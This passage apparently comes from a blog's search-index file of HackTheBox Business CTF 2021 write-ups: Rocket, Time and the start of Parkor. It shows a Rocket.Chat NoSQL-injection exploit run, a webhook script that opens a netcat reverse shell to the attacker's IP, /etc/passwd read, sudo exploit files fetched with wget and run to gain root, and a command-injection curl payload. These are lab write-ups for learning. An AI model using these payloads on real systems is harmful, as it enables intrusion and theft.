OS:A%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)OPS OS:(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST1 OS:1NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN OS:(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N% OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD OS:=S)  Uptime guess: 16.545 days (since Sat Jul 10 00:11:47 2021) Network Distance: 2 hops TCP Sequence Prediction: Difficulty=262 (Good luck!) IP ID Sequence Generation: All zeros Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  TRACEROUTE (using port 80/tcp) HOP RTT       ADDRESS 1   206.65 ms 10.10.14.1 2   208.19 ms rocket.htb (10.129.1.7)  Read data files from: /usr/bin/../share/nmap OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Mon Jul 26 13:15:54 2021 -- 1 IP address (1 host up) scanned in 796.55 seconds  Before we enumerate target machine, we add a new hostname rocket.htb to /etc/hosts in our kali linux machine.   Enumeration  After we have results from nmap, we need to enumerate all open ports. In this case we found some ports such as:     Port 22 (ssh) : OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)   Port 80 (http) : Apache httpd 2.4.41 ((Ubuntu))   Port 3000 (http) : Rocket Chat   and the operating system is Ubuntu Linux   Port 80   port 80 using Apache httpd 2.4.21. The front page of port 80 is html web service Rocket Hosting      From the front page website, we collect email users    elliot@rocket.htb ezekiel@rocket.htb emmap@rocket.htb    admin@rocket.htb   Port 3000   On port 3000, we found Rocket Chat. Let’s using searchploit to get information about Rocket Chat vulnerability  $ searchsploit 'Rocket Chat'  -------------------------------------------------------------------------------- ---------------------------------  Exploit Title                                                                  |  Path -------------------------------------------------------------------------------- --------------------------------- Rocket.Chat 2.1.0 - Cross-Site Scripting                                        | linux/webapps/47537.txt Rocket.Chat 3.12.1 - NoSQL Injection to RCE (Unauthenticated)                   | linux/webapps/49960.py Rocket.Chat 3.12.1 - NoSQL Injection to RCE (Unauthenticated) (2)               | linux/webapps/50108.py -------------------------------------------------------------------------------- --------------------------------- Shellcodes: No Results  From the vulnerability, we found blog about the vulnerability about target NoSQL Injections in Rocket.Chat 3.12.1: How A Small Leak Grounds A Rocket, and exploit from github CVE-2021-22911   Let’s copy the source linux/webapps/49960.py using searchploit  $ searchploit -m linux/webapps/49960.py  From the exploit source codes is change the password from low user and admin/administrator. Now, we change low user is elliot@rocket.htb and admin@rocket.htb.   $ python3.6 49960.py -u \"elliot@rocket.htb\" -a \"admin@rocket.htb\" -t \"http://rocket.htb:3000/\"              1 ⨯ [+] Resetting elliot@rocket.htb password [+] Password Reset Email Sent Got: X Got: Xr Got: Xrm Got: Xrmw Got: XrmwM Got: XrmwM3 Got: XrmwM30 Got: XrmwM30I Got: XrmwM30Ip Got: XrmwM30Ip5 Got: XrmwM30Ip5g Got: XrmwM30Ip5gW Got: XrmwM30Ip5gWX Got: XrmwM30Ip5gWXP Got: XrmwM30Ip5gWXPa Got: XrmwM30Ip5gWXPap Got: XrmwM30Ip5gWXPaps Got: XrmwM30Ip5gWXPapsm Got: XrmwM30Ip5gWXPapsm_ Got: XrmwM30Ip5gWXPapsm_Q Got: XrmwM30Ip5gWXPapsm_Q0 Got: XrmwM30Ip5gWXPapsm_Q0s Got: XrmwM30Ip5gWXPapsm_Q0sN Got: XrmwM30Ip5gWXPapsm_Q0sNv Got: XrmwM30Ip5gWXPapsm_Q0sNv0 Got: XrmwM30Ip5gWXPapsm_Q0sNv0m Got: XrmwM30Ip5gWXPapsm_Q0sNv0mH Got: XrmwM30Ip5gWXPapsm_Q0sNv0mHV Got: XrmwM30Ip5gWXPapsm_Q0sNv0mHV3 Got: XrmwM30Ip5gWXPapsm_Q0sNv0mHV3C Got: XrmwM30Ip5gWXPapsm_Q0sNv0mHV3Ct Got: XrmwM30Ip5gWXPapsm_Q0sNv0mHV3CtF Got: XrmwM30Ip5gWXPapsm_Q0sNv0mHV3CtFZ Got: XrmwM30Ip5gWXPapsm_Q0sNv0mHV3CtFZ0 Got: XrmwM30Ip5gWXPapsm_Q0sNv0mHV3CtFZ0p Got: XrmwM30Ip5gWXPapsm_Q0sNv0mHV3CtFZ0pI Got: XrmwM30Ip5gWXPapsm_Q0sNv0mHV3CtFZ0pIZ Got: XrmwM30Ip5gWXPapsm_Q0sNv0mHV3CtFZ0pIZS Got: XrmwM30Ip5gWXPapsm_Q0sNv0mHV3CtFZ0pIZSH Got: XrmwM30Ip5gWXPapsm_Q0sNv0mHV3CtFZ0pIZSHv Got: XrmwM30Ip5gWXPapsm_Q0sNv0mHV3CtFZ0pIZSHvK Got: XrmwM30Ip5gWXPapsm_Q0sNv0mHV3CtFZ0pIZSHvKR Got: XrmwM30Ip5gWXPapsm_Q0sNv0mHV3CtFZ0pIZSHvKRP [+] Got token : XrmwM30Ip5gWXPapsm_Q0sNv0mHV3CtFZ0pIZSHvKRP [+] Password was changed ! [+] Succesfully authenticated as elliot@rocket.htb Got the code for 2fa: ices.totp is undefined :\\n@:1:56\\n@:1:49\\n\"} [+] Resetting admin@rocket.htb password [+] Password Reset Email Sent Got: P Got: Pu Got: PuQ Got: PuQ9 Got: PuQ9X Got: PuQ9Xh Got: PuQ9XhP Got: PuQ9XhPV Got: PuQ9XhPVI Got: PuQ9XhPVIw Got: PuQ9XhPVIwN Got: PuQ9XhPVIwNt Got: PuQ9XhPVIwNt2 Got: PuQ9XhPVIwNt2O Got: PuQ9XhPVIwNt2Ot Got: PuQ9XhPVIwNt2Otv Got: PuQ9XhPVIwNt2Otvj Got: PuQ9XhPVIwNt2Otvj8 Got: PuQ9XhPVIwNt2Otvj8H Got: PuQ9XhPVIwNt2Otvj8H4 Got: PuQ9XhPVIwNt2Otvj8H4Q Got: PuQ9XhPVIwNt2Otvj8H4QU Got: PuQ9XhPVIwNt2Otvj8H4QUo Got: PuQ9XhPVIwNt2Otvj8H4QUoG Got: PuQ9XhPVIwNt2Otvj8H4QUoGJ Got: PuQ9XhPVIwNt2Otvj8H4QUoGJW Got: PuQ9XhPVIwNt2Otvj8H4QUoGJW6 Got: PuQ9XhPVIwNt2Otvj8H4QUoGJW6_ Got: PuQ9XhPVIwNt2Otvj8H4QUoGJW6_2 Got: PuQ9XhPVIwNt2Otvj8H4QUoGJW6_2K Got: PuQ9XhPVIwNt2Otvj8H4QUoGJW6_2KG Got: PuQ9XhPVIwNt2Otvj8H4QUoGJW6_2KGS Got: PuQ9XhPVIwNt2Otvj8H4QUoGJW6_2KGS9 Got: PuQ9XhPVIwNt2Otvj8H4QUoGJW6_2KGS9y Got: PuQ9XhPVIwNt2Otvj8H4QUoGJW6_2KGS9y2 Got: PuQ9XhPVIwNt2Otvj8H4QUoGJW6_2KGS9y2k Got: PuQ9XhPVIwNt2Otvj8H4QUoGJW6_2KGS9y2kb Got: PuQ9XhPVIwNt2Otvj8H4QUoGJW6_2KGS9y2kbk Got: PuQ9XhPVIwNt2Otvj8H4QUoGJW6_2KGS9y2kbk3 Got: PuQ9XhPVIwNt2Otvj8H4QUoGJW6_2KGS9y2kbk3C Got: PuQ9XhPVIwNt2Otvj8H4QUoGJW6_2KGS9y2kbk3Cf Got: PuQ9XhPVIwNt2Otvj8H4QUoGJW6_2KGS9y2kbk3CfS Got: PuQ9XhPVIwNt2Otvj8H4QUoGJW6_2KGS9y2kbk3CfSA [+] Got token : PuQ9XhPVIwNt2Otvj8H4QUoGJW6_2KGS9y2kbk3CfSA Traceback (most recent call last):   File \"49960.py\", line 164, in &lt;module&gt;     code = oathtool.generate_otp(secret)   File \"/usr/local/lib/python3.6/site-packages/oathtool/__init__.py\", line 59, in generate_otp     key = base64.b32decode(pad(clean(key)), casefold=True)   File \"/usr/local/lib/python3.6/base64.py\", line 231, in b32decode     raise binascii.Error('Non-base32 digit found') from None binascii.Error: Non-base32 digit found profiling:/twseptian/Tools/Python-3.6.9/build/temp.linux-x86_64-3.6/twseptian/Tools/Python-3.6.9/Modules/unicodedata.gcda:Cannot open  Unfortunately, we couldn’t get a shell from the target machine, and we tried to exploit it manually. From the exploit source code, the password credentials will be reset as P@$$w0rd!1234, so let’s log in as elliot or admin.      Gaining Access  The figure above is elliot dashboard. Next navigate to Administration &gt; Integrations or http://rocket.htb:3000/admin/integrations To get shell follows the intructions from tutorial CVE-2021-22911   RCE ( Autenticated - Admin ) Rocket.Chat has a feature called Integrations that allows creating incoming and outgoing web hooks. These web hooks can have scripts associated with them that are executed when the web hook is triggered.   We create a integration with the following script :  const require = console.log.constructor('return process.mainModule.require')(); const { exec } = require('child_process'); exec('command here');   we create an incoming web hooks on Integrations, and in our script are shown below     Name (Optional) = get_shell   Post to Channel = #general   Post as = admin   Script Enabled = ON   Script     const require = console.log.constructor('return process.mainModule.require')(); const { exec } = require('child_process'); exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.172 4444 &gt;/tmp/f');                       Outgoing web hooks on Integrations     Event Trigger Message Sent   Enabled ON   Name (Optional) = get_shell   Channel = #general   Post as = admin     const require = console.log.constructor('return process.mainModule.require')(); const { exec } = require('child_process'); exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.172 4444 &gt;/tmp/f');           Click Save, don’t forget to switch to Enabled,copy the curl commands and paste to our linux terminal  $ curl -X POST -H 'Content-Type: application/json' --data '{\"text\":\"Example message\",\"attachments\":[{\"title\":\"Rocket.Chat\",\"title_link\":\"https://rocket.chat\",\"text\":\"Rocket.Chat, the best open source chat\",\"image_url\":\"/images/integration-attachment-example.png\",\"color\":\"#764FA5\"}]}' http://rocket.htb:3000/hooks/4jdDWiDFop6hq49Ko/5AzZSnkDQBeKSXjYz5aqpdEFPtBmvhWxkzGmgorikTqkGjMu {\"success\":false}   and prepare our netcat listener nc -lvnp 4444  $ nc -lvnp 4444 Ncat: Version 7.91 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.129.1.7. Ncat: Connection from 10.129.1.7:36992. /bin/sh: 0: can't access tty; job control turned off $ whoami ezekiel $   check /etc/passwd  $ cat /etc/passwd root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin sshd:x:112:65534::/run/sshd:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin ezekiel:x:1000:1000:ezekiel:/home/ezekiel:/bin/bash lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false mongodb:x:113:65534::/home/mongodb:/usr/sbin/nologin $  navigate to /home/ezekiel  $ cd /home/ezekiel $ ls -la total 36 drwxr-xr-x 5 ezekiel ezekiel 4096 Jul 26 06:02 . drwxr-xr-x 3 root    root    4096 Jun 22 11:08 .. lrwxrwxrwx 1 root    root       9 Jun 22 11:10 .bash_history -&gt; /dev/null -rw-r--r-- 1 ezekiel ezekiel  220 Feb 25  2020 .bash_logout -rw-r--r-- 1 ezekiel ezekiel 3771 Feb 25  2020 .bashrc drwx------ 2 ezekiel ezekiel 4096 Jun 22 11:08 .cache drwxrwxr-x 3 ezekiel ezekiel 4096 Jun 23 20:11 .local -rw-r--r-- 1 ezekiel ezekiel  807 Feb 25  2020 .profile drwx------ 2 ezekiel ezekiel 4096 Jun 23 20:10 .ssh -r-------- 1 ezekiel ezekiel   46 Jun 23 19:49 user.txt $ cat user.txt HTB{th3_p4ssw0rd_r3s3t_api_1s_n0t_r0ck_s0l1d} $    Privilege Escalation  Let’s check sudo version using sudo --version  ezekiel@rocket:~$ sudo --version sudo --version Sudo version 1.8.31 Sudoers policy plugin version 1.8.31 Sudoers file grammar version 46 Sudoers I/O plugin version 1.8.31 ezekiel@rocket:~$  We found tutorial about CVE-2021-3156 https://github.com/mohinparamasivam/Sudo-1.8.31-Root-Exploit, and how to check the vulnerability?, we follow the information from github exploit repo, and they said   You can check your version of sudo is vulnerable with: $ sudoedit -s Y. If it asks for your password it’s most likely vulnerable, if it prints usage information it isn’t.   Now run sudoedit -s Y  ezekiel@rocket:/tmp$ sudoedit -s Y sudoedit -s Y [sudo] password for ezekiel:   Sorry, try again. [sudo] password for ezekiel:   Sorry, try again. [sudo] password for ezekiel:  Okay, sudo is vulnerable. Let’s clone using command git clone to take all the exploit source codes  $ git clone https://github.com/mohinparamasivam/Sudo-1.8.31-Root-Exploit.git Cloning into 'Sudo-1.8.31-Root-Exploit'... remote: Enumerating objects: 9, done. remote: Counting objects: 100% (9/9), done. remote: Compressing objects: 100% (7/7), done. remote: Total 9 (delta 0), reused 6 (delta 0), pack-reused 0 Receiving objects: 100% (9/9), done. $ cd Sudo-1.8.31-Root-Exploit $ ls -la total 28 drwxr-xr-x 3 twseptian twseptian 4096 Jul 26 15:23 . drwxr-xr-x 3 twseptian twseptian 4096 Jul 26 15:23 .. -rw-r--r-- 1 twseptian twseptian 2048 Jul 26 15:23 exploit.c drwxr-xr-x 8 twseptian twseptian 4096 Jul 26 15:23 .git -rw-r--r-- 1 twseptian twseptian  208 Jul 26 15:23 Makefile -rw-r--r-- 1 twseptian twseptian  692 Jul 26 15:23 README.md -rw-r--r-- 1 twseptian twseptian  599 Jul 26 15:23 shellcode.c  prepare python3 web server on kali machine sudo python3 -m http.server 80,  $ sudo python3 -m http.server 80  Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ..  and in target machine download exploit  ezekiel@rocket:/tmp$ mkdir jgn_dihapus mkdir jgn_dihapus ezekiel@rocket:/tmp$ cd jgn_dihapus cd jgn_dihapus ezekiel@rocket:/tmp/jgn_dihapus$ ls -la ls -la total 8 drwxr-xr-x  2 ezekiel ezekiel 4096 Jul 26 08:37 . drwxrwxrwt 16 root    root    4096 Jul 26 08:37 .. ezekiel@rocket:/tmp/jgn_dihapus$ wget http://10.10.14.172/exploit.c wget http://10.10.14.172/exploit.c --2021-07-26 08:37:44--  http://10.10.14.172/exploit.c Connecting to 10.10.14.172:80... connected. HTTP request sent, awaiting response... 200 OK Length: 2048 (2.0K) [text/x-csrc] Saving to: ‘exploit.c’  exploit.c           100%[===================&gt;]   2.00K  --.-KB/s    in 0.02s     2021-07-26 08:37:45 (113 KB/s) - ‘exploit.c’ saved [2048/2048]  ezekiel@rocket:/tmp/jgn_dihapus$ wget http://10.10.14.172/Makefile wget http://10.10.14.172/Makefile --2021-07-26 08:38:00--  http://10.10.14.172/Makefile Connecting to 10.10.14.172:80... connected. HTTP request sent, awaiting response... 200 OK Length: 208 [application/octet-stream] Saving to: ‘Makefile’  Makefile            100%[===================&gt;]     208  --.-KB/s    in 0.009s    2021-07-26 08:38:00 (22.2 KB/s) - ‘Makefile’ saved [208/208]  ezekiel@rocket:/tmp/jgn_dihapus$ wget http://10.10.14.172/shellcode.c wget http://10.10.14.172/shellcode.c --2021-07-26 08:38:13--  http://10.10.14.172/shellcode.c Connecting to 10.10.14.172:80... connected. HTTP request sent, awaiting response... 200 OK Length: 599 [text/x-csrc] Saving to: ‘shellcode.c’  shellcode.c         100%[===================&gt;]     599  --.-KB/s    in 0s        2021-07-26 08:38:13 (68.6 MB/s) - ‘shellcode.c’ saved [599/599]  give chmod +x permission to Makefile, run make  ezekiel@rocket:/tmp/jgn_dihapus$ chmod +x Makefile chmod +x Makefile ezekiel@rocket:/tmp/jgn_dihapus$ make make mkdir libnss_x cc -O3 -shared -nostdlib -o libnss_x/x.so.2 shellcode.c cc -O3 -o exploit exploit.c ezekiel@rocket:/tmp/jgn_dihapus$  Now we have our executable exploit file  ezekiel@rocket:/tmp/jgn_dihapus$ ls -la ls -la total 44 drwxr-xr-x  3 ezekiel ezekiel  4096 Jul 26 08:38 . drwxrwxrwt 16 root    root     4096 Jul 26 08:38 .. -rwxr-xr-x  1 ezekiel ezekiel 16800 Jul 26 08:38 exploit -rw-r--r--  1 ezekiel ezekiel  2048 Jul 26 08:23 exploit.c drwxr-xr-x  2 ezekiel ezekiel  4096 Jul 26 08:38 libnss_x -rwxr-xr-x  1 ezekiel ezekiel   208 Jul 26 08:23 Makefile -rw-r--r--  1 ezekiel ezekiel   599 Jul 26 08:23 shellcode.c  run ./exploit  ezekiel@rocket:/tmp/jgn_dihapus$ ./exploit ./exploit # whoami whoami root    ","categories": ["HackTheBox","HackTheBox Business CTF 2021","CTF"],
        "tags": ["HackTheBox Business CTF 2021","Rocket Chat","CVE-2021-22911","CVE-2021-3156"],
        "url": "http://localhost:4000/hackthebox/hackthebox%20business%20ctf%202021/ctf/htbbiz2021-rocket/",
        "teaser": "http://localhost:4000/assets/images/htb-frame.png"
      },{
        "title": "HackTheBox Business CTF 2021 - Time (Web)",
        "excerpt":"Time is a web challenge from HackTheBox Business CTF 2021. This challenge is talking about how to access with using date format? and how to bypass the flag file after we get the date from target machine.   First, run the docker instance,copy the address to browser    Let’s download the source codes,and navigate to TimeController.php  &lt;?php class TimeController {     public function index($router)     {         $format = isset($_GET['format']) ? $_GET['format'] : '%H:%M:%S';         $time = new TimeModel($format);         return $router-&gt;view('index', ['time' =&gt; $time-&gt;getTime()]);     } }  From the TimeController.php source codes, we found $format = isset($_GET['format']) ? $_GET['format'] : '%H:%M:%S'; with get access to parameter format,then we need to know how to get the flag. Let’s analyze the TimeModel.php code  &lt;?php class TimeModel {     public function __construct($format)     {         $this-&gt;command = \"date '+\" . $format . \"' 2&gt;&amp;1\";     }      public function getTime()     {         $time = exec($this-&gt;command);         $res  = isset($time) ? $time : '?';         return $res;     } }  from $this-&gt;command = \"date '+\" . $format . \"' 2&gt;&amp;1\"; we know about the date format and how to execute command from the target url.   Let’s try using curl  $ curl 'http://142.93.35.92:30370/?format=%H-%M-%S-%27;$(cat%20../flag)%27' &lt;html&gt; &lt;head&gt;   &lt;meta name='author' content='makelaris, makelarisjr'&gt;   &lt;meta name='viewport' content='width=device-width, initial-scale=1, shrink-to-fit=no'&gt;   &lt;title&gt;Time&lt;/title&gt;   &lt;link link='preload' href='//fonts.googleapis.com/css2?family=Press+Start+2P&amp;display=swap' rel='stylesheet'&gt;   &lt;link rel='stylesheet' href='//maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css' integrity='sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm' crossorigin='anonymous'&gt;   &lt;link rel='icon' href='/assets/favicon.png' /&gt;   &lt;link rel='stylesheet' href='/static/main.css' /&gt; &lt;/head&gt; &lt;body&gt;   &lt;nav class=\"navbar navbar-dark bg-primary navbar-expand-lg mb-4\"&gt;     &lt;a class=\"navbar-brand mb-0\" href=\"?format=%H:%M:%S\"&gt;🕒 What's the time?&lt;/a&gt;     &lt;div class=\"collapse navbar-collapse\" id=\"navbarSupportedContent\"&gt;       &lt;ul class=\"navbar-nav\"&gt;         &lt;li class=\"nav-item\"&gt;           &lt;a class=\"nav-link\" href=\"?format=%Y-%m-%d\"&gt;📅 What's the date? &lt;span class=\"sr-only\"&gt;(current)&lt;/span&gt;&lt;/a&gt;         &lt;/li&gt;       &lt;/ul&gt;     &lt;/div&gt;   &lt;/nav&gt;   &lt;div class=\"jumbotron vertical-center\"&gt;     &lt;div class=\"container\"&gt;       &lt;div class=\"container\"&gt;         &lt;h1 class=\"jumbotron-heading\"&gt;&gt;&lt;span class='text-muted'&gt;It's&lt;/span&gt; sh: 1: HTB{tim3_t4lks...4nd_1t_s4ys_1ts_t1m3_t0_PWN!!!}: not found&lt;span class='text-muted'&gt;.&lt;/span&gt;&lt;/h1&gt;       &lt;/div&gt;     &lt;/div&gt;   &lt;/div&gt; &lt;/body&gt; &lt;script src=\"https://code.jquery.com/jquery-3.4.1.slim.min.js\" integrity=\"sha384-J6qa4849blE2+poT4WnyKhv5vZF5SrPo0iEjwBvKU7imGFAV0wwj1yYfoRSJoZ+n\" crossorigin=\"anonymous\"&gt;&lt;/script&gt; &lt;script src=\"https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js\" integrity=\"sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo\" crossorigin=\"anonymous\"&gt;&lt;/script&gt; &lt;script src=\"https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js\" integrity=\"sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6\" crossorigin=\"anonymous\"&gt;&lt;/script&gt; &lt;/html&gt;   or  $ curl 'http://142.93.35.92:30370/?format=%H-%M-%S-%27;$(cat%20../flag)%27' | html2text | grep HTB{   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                  Dload  Upload   Total   Spent    Left  Speed 100  1974    0  1974    0     0   1171      0 --:--:--  0:00:01 --:--:--  1171 ****** &gt;It's sh: 1: HTB{tim3_t4lks...4nd_1t_s4ys_1ts_t1m3_t0_PWN!!!}: not     ","categories": ["HackTheBox","HackTheBox Business CTF 2021","CTF"],
        "tags": ["HackTheBox Business CTF 2021"],
        "url": "http://localhost:4000/hackthebox/hackthebox%20business%20ctf%202021/ctf/htbbiz2021-time/",
        "teaser": "http://localhost:4000/assets/images/htb-frame.png"
      },{
        "title": "HackTheBox Business CTF 2021 - Parkor (Fullpwn)",
        "excerpt":"Parkor is a fullpwn (Windows OS) challenge from HackTheBox Business CTF 2021. The vulnerabilities on target are Cockpit CMS NoSQL injection in /auth/resetpassword (CVE-2020-35847) Cockpit CMS NoSQL injection in /auth/newpassword (CVE-2020-35848), Cockpit CMS PHP injection in the UtilArrayQuery::buildCondition method of the MongoLite library.   Network Scanning  Before we scan all ports using nmap, we add parkor.htb to our /etc/hosts. Let’s find all open ports, services on the target machine using nmap  # Nmap 7.91 scan initiated Tue Jul 27 16:43:07 2021 as: nmap -sC -sV -T4 -A -p- --vv -oN nmap/nmap_parkor parkor.htb adjust_timeouts2: packet supposedly had rtt of -50994 microseconds.  Ignoring time. adjust_timeouts2: packet supposedly had rtt of -50994 microseconds.  Ignoring time. adjust_timeouts2: packet supposedly had rtt of -59480 microseconds.  Ignoring time. adjust_timeouts2: packet supposedly had rtt of -59480 microseconds.  Ignoring time. adjust_timeouts2: packet supposedly had rtt of -59476 microseconds.  Ignoring time. adjust_timeouts2: packet supposedly had rtt of -59476 microseconds.  Ignoring time. Nmap scan report for parkor.htb (10.129.1.2) Host is up, received echo-reply ttl 127 (0.22s latency). Scanned at 2021-07-27 16:43:08 WIB for 242s Not shown: 65534 filtered ports Reason: 65534 no-responses PORT   STATE SERVICE REASON          VERSION 80/tcp open  http    syn-ack ttl 127 Apache httpd 2.4.48 (OpenSSL/1.1.1k PHP/7.4.20) |_http-favicon: Unknown favicon MD5: 6EB4A43CB64C97F76562AF703893C8FD | http-methods:  |   Supported Methods: OPTIONS HEAD GET POST TRACE |_  Potentially risky methods: TRACE |_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/7.4.20 |_http-title: 403 Forbidden Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: broadband router|specialized|router Running (JUST GUESSING): OneAccess embedded (88%), AVtech embedded (85%), HP embedded (85%) OS CPE: cpe:/h:oneaccess:1641 cpe:/h:hp:procurve_7102dl OS fingerprint not ideal because: Missing a closed TCP port so results incomplete Aggressive OS guesses: OneAccess 1641 router (88%), AVtech Room Alert 26W environmental monitor (85%), HP ProCurve Secure Router 7102dl (85%) No exact OS matches for host (test conditions non-ideal). TCP/IP fingerprint: SCAN(V=7.91%E=4%D=7/27%OT=80%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=60FFD61E%P=x86_64-pc-linux-gnu) SEQ(SP=102%GCD=1%ISR=10B%TS=U) SEQ(SP=102%GCD=1%ISR=10E%TI=RD%II=I%TS=U) OPS(O1=M54DNW8NNS%O2=M54DNW8NNS%O3=M54DNW8%O4=M54DNW8NNS%O5=M54DNW8NNS%O6=M54DNNS) WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70) ECN(R=Y%DF=Y%TG=80%W=FFFF%O=M54DNW8NNS%CC=Y%Q=) ECN(R=N) T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=) T2(R=N) T3(R=N) T4(R=N) U1(R=N) IE(R=Y%DFI=N%TG=80%CD=Z)  Network Distance: 2 hops TCP Sequence Prediction: Difficulty=258 (Good luck!) IP ID Sequence Generation: Randomized Service Info: Host: localhost  TRACEROUTE (using port 80/tcp) HOP RTT       ADDRESS 1   231.71 ms 10.10.14.1 2   231.89 ms parkor.htb (10.129.1.2)  Read data files from: /usr/bin/../share/nmap OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Tue Jul 27 16:47:10 2021 -- 1 IP address (1 host up) scanned in 242.90 seconds   Enumeration  From the nmap scanning, we just found port 80, and using Apache httpd 2.4.48 (OpenSSL/1.1.1k PHP/7.4.20).    Let’s enumerate web directory using ffuf, and we used /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt from SecLists   $ ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -u http://parkor.htb/FUZZ -mc 200,301,302 -e .php.,txt.,html          /'___\\  /'___\\           /'___\\               /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/               \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\               \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/                \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\                  \\/_/    \\/_/   \\/___/    \\/_/                v1.3.0-git ________________________________________________   :: Method           : GET  :: URL              : http://parkor.htb/FUZZ  :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt  :: Extensions       : .php. txt. html   :: Follow redirects : false  :: Calibration      : false  :: Timeout          : 10  :: Threads          : 40  :: Matcher          : Response status: 200,301,302 ________________________________________________  img                     [Status: 301, Size: 331, Words: 22, Lines: 10] xampp                   [Status: 301, Size: 333, Words: 22, Lines: 10] cockpit                 [Status: 301, Size: 335, Words: 22, Lines: 10] :: Progress: [224652/224652] :: Job [1/1] :: 118 req/sec :: Duration: [0:21:58] :: Errors: 8 ::  we found directory img,xampp, and cockpit. when we access img,and xampp will redirect to Forbidden permission.       but, when we access directory cockpit, it will redirect to http://parkor.htb/cockpit/auth/login?to=/      Cockpit CMS   On directory /cockpit is run Cockpit CMS. Let’s check Cockpit CMS version http://parkor.htb/cockpit/package.json    Now we have information about cockpit cms version = 0.11.1   Vulnerabilities      Cockpit CMS 0.11.1 NoSQL Injection / Remote Command Execution   From 0 to RCE: Cockpit CMS   First, we need enumerate users in cockpit CMS. Let’s follow the instructions from From 0 to RCE: Cockpit CMS about NoSQL injection in /auth/requestreset      navigate to forgot password and input var_dump,         intercept request using burp suite, and change the parameter.         Now, we found the users   [SNIP] string(7) 